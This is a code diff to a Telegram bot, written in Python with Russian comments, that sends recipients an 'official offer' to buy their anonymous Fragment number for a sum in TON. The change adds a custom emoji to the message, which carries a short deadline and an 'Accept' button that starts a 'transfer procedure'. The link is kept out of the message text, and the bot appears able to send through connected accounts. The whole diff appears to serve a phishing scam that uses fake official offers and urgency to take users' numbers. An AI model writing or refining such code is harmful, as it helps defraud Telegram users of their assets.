@@ -14,9 +14,12 @@ dispatcher = Dispatcher()
 
 CHECK_EMOJI_ID = "5774022692642492953"
 CROSS_EMOJI_ID = "5778527486270770928"
+CUSTOM_EMOJI_ID = "6023826881160157558"
 
 FRAGMENT_ICON_ID = "6014820764237171679"
 WALLET_ICON_ID = "5987635334945444280"
+
+CUSTOM_EMOJI = f'<tg-emoji emoji-id="{CUSTOM_EMOJI_ID}">💎</tg-emoji>'
 
 async def safe_delete(chat_id, message_id, conn_id=None):
     if conn_id:
@@ -67,9 +70,9 @@ async def send_offer(message: Message):
     amount_text = f"{amount} TON"
     fragment_link = f"https://fragment.com/number/{phone_clean}"
 
-    # ТЕКСТ (ССЫЛКИ ЗДЕСЬ НЕТ)
+    # ТЕКСТ С ЭМОДЗИ И БЕЗ ССЫЛКИ
     offer_text = (
-        f"Вам поступило официальное предложение о выкупе вашего анонимного номера.\n\n"
+        f"{CUSTOM_EMOJI} Вам поступило официальное предложение о выкупе вашего анонимного номера.\n\n"
         f"Сумма: <b>{amount_text}</b>\n"
         f"Срок действия: <b>5ч 59м</b>\n\n"
         f"<i>Для рассмотрения предложения и запуска процедуры передачи, нажмите «Принять».</i>"
@@ -81,7 +84,6 @@ async def send_offer(message: Message):
     ]])
 
     try:
-        # Отправляем сообщение с превью, но без ссылки в тексте
         await bot.send_message(
             chat_id=message.chat.id,
             text=offer_text,
